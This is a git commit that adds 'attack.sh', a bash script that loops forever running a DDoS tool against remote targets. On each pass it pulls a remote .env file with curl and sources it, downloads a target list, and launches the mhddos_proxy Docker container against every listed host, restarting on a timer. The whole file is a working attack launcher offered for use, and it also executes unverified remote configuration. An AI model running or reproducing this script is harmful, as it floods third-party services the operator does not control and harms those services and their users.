a8f82568d8203f67d8a7d4dd8a6d85e966609898
Igor Malinovskiy <ihor.malinovskiy@gmail.com>
2022-06-03 13:28:23 +0300

    Add attack script

---
+++ attack.sh
@@ -0,0 +1,49 @@
+#!/bin/bash
+
+SETTINGS_URL=https://raw.githubusercontent.com/psyipm/itarmy/main/.env
+
+function load_settings () {
+  curl -s $SETTINGS_URL > .env
+  source .env
+}
+
+function load_targets () {
+  curl -s $TARGETS_URL > targets.lst
+}
+
+function attack () {
+  load_targets
+
+  docker run $(echo $DOCKER_OPTIONS) \
+    ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest \
+    $(cat ./targets.lst) \
+    $(echo $ATTACK_OPTIONS)
+}
+
+function cleanup () {
+  docker kill $CONTAINER_NAME
+}
+
+function restart () {
+  sleep $RESTART_IN
+  cleanup
+}
+
+while true
+do
+  load_settings
+
+  echo "Scheduling restart in $RESTART_IN seconds..."
+  restart&
+
+  echo "Starting attack..."
+  attack
+
+  echo "Attack stopped"
+
+  echo "Killing all running containers..."
+  cleanup
+
+  echo "Cooling down..."
+  sleep 30
+done
